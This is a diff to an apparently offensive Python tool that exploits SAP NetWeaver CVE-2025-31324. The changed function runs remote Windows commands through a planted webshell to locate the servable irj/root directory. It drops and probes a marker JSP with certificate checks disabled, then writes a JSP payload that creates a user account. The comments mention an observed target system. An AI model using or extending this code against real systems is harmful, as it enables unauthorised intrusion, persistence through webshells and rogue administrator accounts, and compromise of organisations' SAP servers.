@@ -545,14 +545,42 @@ def deploy_create_user_jsp_via_cve_31324(node, writer_fn) -> dict:
 
     # --- Step 2: locate the webshell on disk (= real irj/root) ---
     dir_path = ""
-    for drive in ("C", "D", "E", "F"):
-        cmd = f"dir /s /b {drive}:\\usr\\sap\\{shell_name} 2>nul"
-        r = writer_fn(cmd)
-        dir_path = _parse_path_from_output(r.get("output") or [], shell_name)
-        if dir_path:
-            print(f"[*] {sid}: located webshell at {dir_path}\\{shell_name} "
-                  f"— using it as irj/root")
-            break
+
+    # 2a: Try the canonical NW 7.x path FIRST — much more reliable than a
+    # filename search, which can return a stray copy dropped by the
+    # CVE-31324 chunked write's ../.. traversal or a leftover from a
+    # prior attempt (observed on SJJ: dir/s/b returned the parent
+    # ...\irj\ instead of ...\irj\root\ → the freshly written UME JSP
+    # was unreachable at /irj/, all 6 GET probes 404'd, 19s wasted).
+    # Instance NN is derived from the Java HTTP port (5NN00 layout).
+    java_nn = ((port - 50000) // 100) if port >= 50000 else -1
+    sap_sid = node.sid or ""
+    if sap_sid and 0 <= java_nn <= 99:
+        for inst_prefix in ("J", "JC", "JD"):
+            cand = (fr"C:\usr\sap\{sap_sid}\{inst_prefix}{java_nn:02d}"
+                    fr"\j2ee\cluster\apps\sap.com\irj"
+                    fr"\servlet_jsp\irj\root")
+            r = writer_fn(f'if exist "{cand}\\." (echo YES) else (echo NO)')
+            out = " ".join(
+                str(l) for l in (r.get("output") or [])).upper()
+            if "YES" in out:
+                dir_path = cand
+                print(f"[*] {sid}: using canonical Java irj/root: "
+                      f"{dir_path}")
+                break
+
+    # 2b: Fall back to filename-based search when the canonical path
+    # isn't present (non-default drive, non-standard NW layout).
+    if not dir_path:
+        for drive in ("C", "D", "E", "F"):
+            cmd = f"dir /s /b {drive}:\\usr\\sap\\{shell_name} 2>nul"
+            r = writer_fn(cmd)
+            dir_path = _parse_path_from_output(
+                r.get("output") or [], shell_name)
+            if dir_path:
+                print(f"[*] {sid}: located webshell at "
+                      f"{dir_path}\\{shell_name} — using it as irj/root")
+                break
 
     if not dir_path:
         # Last-resort: PowerShell recursive search across all fixed drives.
@@ -594,12 +622,77 @@ def deploy_create_user_jsp_via_cve_31324(node, writer_fn) -> dict:
         return {"success": False,
                 "error": f"sap_cve_2025_31324 module not importable: {format_rfc_exception(e)}"}
 
-    jsp_name = _random_jsp_name("ume")
-    target_path = f"{dir_path}\\{jsp_name}"
     shell_url = shells[-1].get("url", "")
     if not shell_url:
         return {"success": False,
                 "error": "webshell record missing 'url' — cannot chunk-write"}
+
+    # --- Step 2c: verify dir_path actually serves at /irj/ before we
+    # commit the ~14 KB UME payload write.  Drop a 20-byte marker JSP,
+    # GET-probe it — if it 404s, dir_path is wrong (typical failure mode:
+    # the search returned a stray copy in ...\irj\ instead of the real
+    # ...\irj\root\).  On failure, try dir_path + "\root" as a rescue
+    # step before giving up.  Marker probes give Jasper a few seconds to
+    # notice the file; the operator log tells them what got tried.
+    scheme_probe = ("https" if getattr(node, "cve_2025_31324_https", False)
+                     else "http")
+    host_probe = node.ip or node.hostname
+    marker_name = _random_jsp_name("chk")
+    marker_body = b'<%= "UMEROOT_OK" %>'
+    def _probe_serves(check_dir: str) -> bool:
+        marker_path = f"{check_dir}\\{marker_name}"
+        wr_m = write_file_via_shell(shell_url, marker_path,
+                                     marker_body,
+                                     chunk_size=1000, timeout=10.0)
+        if not wr_m.get("success"):
+            return False
+        marker_url = (f"{scheme_probe}://{host_probe}:{port}"
+                      f"/irj/{marker_name}")
+        import time as _t
+        for _d in (0, 1, 2, 3):
+            if _d:
+                _t.sleep(_d)
+            try:
+                ctx_m = ssl._create_unverified_context()
+                req_m = urllib.request.Request(
+                    marker_url, headers={"User-Agent": _UA})
+                with urllib.request.urlopen(
+                        req_m, timeout=8, context=ctx_m) as pr_m:
+                    if pr_m.status == 200:
+                        txt = pr_m.read(64).decode(
+                            "latin1", errors="replace")
+                        if "UMEROOT_OK" in txt:
+                            return True
+            except (urllib.error.HTTPError,
+                    urllib.error.URLError,
+                    TimeoutError, OSError):
+                continue
+        return False
+
+    if not _probe_serves(dir_path):
+        rescue = f"{dir_path}\\root"
+        print(f"[*] {sid}: marker probe under {dir_path} did not serve "
+              f"at /irj/{marker_name} — trying rescue path {rescue}")
+        # Verify the rescue dir even exists before wasting a write.
+        r_ex = writer_fn(
+            f'if exist "{rescue}\\." (echo YES) else (echo NO)')
+        out_ex = " ".join(
+            str(l) for l in (r_ex.get("output") or [])).upper()
+        if "YES" in out_ex and _probe_serves(rescue):
+            dir_path = rescue
+            print(f"[*] {sid}: rescue path {dir_path} serves — using it")
+        else:
+            return {"success": False,
+                    "error": (f"located dir_path {dir_path} does not "
+                              f"serve at /irj/ (marker probe 404). "
+                              f"Rescue path {rescue} also unusable "
+                              f"— cannot determine real irj/root")}
+    else:
+        print(f"[*] {sid}: marker probe confirmed {dir_path} serves "
+              f"at /irj/")
+
+    jsp_name = _random_jsp_name("ume")
+    target_path = f"{dir_path}\\{jsp_name}"
 
     wr = write_file_via_shell(shell_url, target_path,
                                UME_CREATE_JSP.encode("utf-8"),
